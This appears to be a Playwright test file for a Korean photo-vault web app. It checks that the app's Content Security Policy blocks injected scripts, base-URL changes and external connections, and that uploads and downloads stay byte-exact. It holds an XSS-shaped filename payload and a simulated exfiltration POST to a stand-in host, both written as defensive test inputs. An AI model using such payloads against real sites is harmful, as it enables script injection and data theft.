import { test, expect } from '@playwright/test';
import { readFile } from 'node:fs/promises';

const pixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+jRZkAAAAASUVORK5CYII=', 'base64');

test('built app loads without identity requests and preserves original upload/view/download under CSP', async ({ page }) => {
  const external: string[] = [];
  const errors: string[] = [];
  page.on('pageerror', error => errors.push(error.message));
  await page.route('**/*', async route => {
    if (new URL(route.request().url()).origin !== 'http://127.0.0.1:5175') {
      external.push(route.request().url());
      await route.abort();
    } else await route.continue();
  });
  await page.goto('./');
  await expect(page.getByRole('heading', { name: '보관함', exact: true })).toBeVisible();
  await page.getByRole('button', { name: '기기 보관함', exact: true }).click();
  await expect(page.getByRole('main')).toHaveAttribute('aria-busy', 'false');
  // An injection-shaped filename must stay text in the production React bundle.
  const name = '<img src=x onerror=alert(1)>.png';
  await page.getByLabel('사진 파일 선택').setInputFiles({ name, mimeType: 'image/png', buffer: pixel });
  await expect(page.locator('article.photo-card')).toHaveCount(1);
  await page.getByRole('button', { name: `${name} 크게 보기`, exact: true }).click();
  await expect(page.getByRole('dialog').getByRole('img', { name, exact: true })).toBeVisible();
  await page.getByRole('button', { name: '뷰어 닫기' }).click();
  await page.getByRole('button', { name: `${name} 선택`, exact: true }).click();
  await page.getByRole('button', { name: '선택 다운로드', exact: true }).click();
  const downloaded = page.waitForEvent('download');
  await page.getByRole('button', { name: `${name} 원본 다운로드`, exact: true }).click();
  expect(await readFile((await (await downloaded).path())!)).toEqual(pixel);
  expect(external).toEqual([]);
  expect(errors).toEqual([]);
});

test('built policy blocks injected scripts, external connections and base URL changes', async ({ page }) => {
  await page.goto('./');
  await expect(page.getByRole('heading', { name: '보관함', exact: true })).toBeVisible();
  const result = await page.evaluate(async () => {
    const violations: string[] = [];
    document.addEventListener('securitypolicyviolation', event => violations.push(event.effectiveDirective));
    const script = document.createElement('script');
    script.textContent = 'document.documentElement.dataset.injected = "yes"';
    document.body.append(script);
    const base = document.createElement('base');
    base.href = 'https://blocked.invalid/';
    document.head.append(base);
    const video = document.createElement('video');
    video.src = 'https://blocked.invalid/video.mp4'; document.body.append(video);
    let blocked = false;
    try { await fetch('https://blocked.invalid/exfiltrate', { method: 'POST', body: 'synthetic' }); }
    catch { blocked = true; }
    // CSP violation events are delivered asynchronously.
    await new Promise(resolve => setTimeout(resolve, 100));
    return { blocked, injected: document.documentElement.dataset.injected, base: document.baseURI, violations, referrer: document.querySelector('meta[name="referrer"]')?.getAttribute('content') };
  });
  expect(result.injected).toBeUndefined();
  expect(result.blocked).toBe(true);
  expect(result.base).toBe(page.url());
  expect(result.violations).toEqual(expect.arrayContaining(['script-src-elem', 'connect-src', 'base-uri', 'media-src']));
  expect(result.referrer).toBe('no-referrer');
});


test('built CSP allows original blob video playback and byte-preserving downloads', async ({ page }) => {
  await page.goto('./');
  await page.getByRole('button', { name: '기기 보관함', exact: true }).click();
  const bytes = await page.evaluate(async () => {
    const canvas = document.createElement('canvas'); canvas.width = 8; canvas.height = 8;
    const context = canvas.getContext('2d')!; context.fillStyle = '#485e35'; context.fillRect(0, 0, 8, 8);
    const stream = canvas.captureStream(10);
    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
    const chunks: Blob[] = [];
    const stopped = new Promise<Blob>(resolve => {
      recorder.ondataavailable = event => { if (event.data.size) chunks.push(event.data); };
      recorder.onstop = () => resolve(new Blob(chunks, { type: 'video/webm' }));
    });
    recorder.start(); window.setTimeout(() => recorder.stop(), 150);
    try { return Array.from(new Uint8Array(await (await stopped).arrayBuffer())); }
    finally { stream.getTracks().forEach(track => track.stop()); }
  });
  const buffer = Buffer.from(bytes);
  await page.getByLabel('사진 파일 선택').setInputFiles({ name: 'synthetic.webm', mimeType: 'video/webm', buffer });
  await expect(page.locator('article.photo-card')).toHaveCount(1);
  await page.getByRole('button', { name: 'synthetic.webm 크게 보기', exact: true }).click();
  const video = page.getByRole('dialog').locator('video');
  await expect(video).toHaveAttribute('src', /^blob:/);
  await expect.poll(() => video.evaluate(element => (element as HTMLVideoElement).readyState)).toBeGreaterThan(0);
  await expect(video).toHaveAttribute('controls', '');
  await page.getByRole('button', { name: '뷰어 닫기', exact: true }).click();
  await page.getByRole('button', { name: 'synthetic.webm 선택', exact: true }).click();
  await page.getByRole('button', { name: '선택 다운로드', exact: true }).click();
  const downloaded = page.waitForEvent('download');
  await page.getByRole('button', { name: 'synthetic.webm 원본 다운로드', exact: true }).click();
  expect(await readFile((await (await downloaded).path())!)).toEqual(buffer);
});
